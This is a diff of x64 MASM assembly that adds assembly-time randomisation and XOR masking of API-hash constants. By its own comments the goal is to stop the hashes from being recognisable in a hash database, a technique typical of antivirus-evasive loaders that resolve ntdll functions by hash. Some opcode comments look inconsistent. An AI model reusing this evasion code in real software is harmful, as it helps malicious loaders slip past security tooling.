@@ -99,15 +99,29 @@ s_sub_rall      equ 0x2b        ; sub r/16/32/64
 s_xor_rall      equ 0x33        ; xor r/16/32/64
 s_cmp_rall      equ 0x3b        ; cmp r/16/32/64
 s_mov_rall      equ 0x8b        ; mov r/16/32/64
+s_mov_r8_imm8   equ 0xb0        ; mov r8 imm8
 s_mov_r8        equ 0x8a        ; mov r8 r/m8
 s_mov_r8_imm    equ 0xb8        ; mov r8 imm8
 s_mov_r64_imm64 equ 0xC7        ; mov r64 imm64
 s_shl           equ 0xe0c1      ; shl 
 
-; Get an assembly-time random value of a specific size. Maximum 32 bits.
+; Get an assembly-time random value of a specific size. Maximum 32 bits. 
+; This value will change on successive expansions
 rnd macro __mask
     local m
     m=(@SubStr(%@Time,7,2)+@Line)*(@SubStr(%@Date,1,2)+@SubStr(%@Date,4,2)*100+@SubStr(%@Date,7,2))* (-1001)
+    m=(m+@SubStr(%@Time,1,2)+@SubStr(%@Time,4,2))*(@SubStr(%@Time,7,2)+1)
+    ifnb <__mask>
+        m = m and __mask
+    endif
+    exitm % m
+endm
+
+; Get an assembly-time random byte. This value will stay the same on successive
+; expansions
+static_rnd macro __mask
+    local m
+    m=(@SubStr(%@Time,7,2)) xor (@SubStr(%@Date,7,2))
     m=(m+@SubStr(%@Time,1,2)+@SubStr(%@Time,4,2))*(@SubStr(%@Time,7,2)+1)
     ifnb <__mask>
         m = m and __mask
@@ -195,18 +209,32 @@ endm
 ;
 ; We go through a little more trouble to protect these:
 ;
-random_mask         equ rnd(0xffffffff)            
-%echo random_mask            
-hash_basis          equ     0xC59D1C81  xor random_mask      
-hash_prime          equ     0x01000193  xor random_mask     
-decoded_basis       equ hash_basis xor random_mask
+random_mask         equ static_rnd(0xfffffff)
+hash_basis          equ            0xC59D1C81  xor random_mask      
+hash_prime          equ            0x01000193  xor random_mask     
 
 ;
 ; Our function hashes will all be double words of high entropy but at least
 ; they won't be a dead giveaway in a hash database
 ;
-hash_ntdll      equ         0x76536EBB xor random_mask
-hash_ntavm      equ     0x6640A8978F501F9A xor random_mask
+hash_ntdll      equ         0x25959F7F xor random_mask
+hash_ntavm      equ         0x6640A89B xor random_mask
+
+_movd_mask macro reg, ext
+    if ext eq 1
+        db s_pfx_rexwb
+    endif 
+
+    db s_mov_r8_imm8
+    db random_mask
+
+    if ext eq 1
+        db s_pfx_rexwb
+    endif
+
+    dw s_shl or reg
+
+endm
 
 ; Data Structures ------;
 dapi_entry struct       ; dynamic import table entry
@@ -227,7 +255,10 @@ text segment align(0x10) 'code' read execute
 start proc
     local   d_ents[10]:dapi_entry
     local   d_table:dapi
-
+    mov     eax, random_mask
+    shl     rax, 8
+    ;_movd_mask _eax, 0
+    ;_movd_mask _r8, 1
     mov     rcx, hash_ntdll
     call    getmod
     mov     rcx, rax
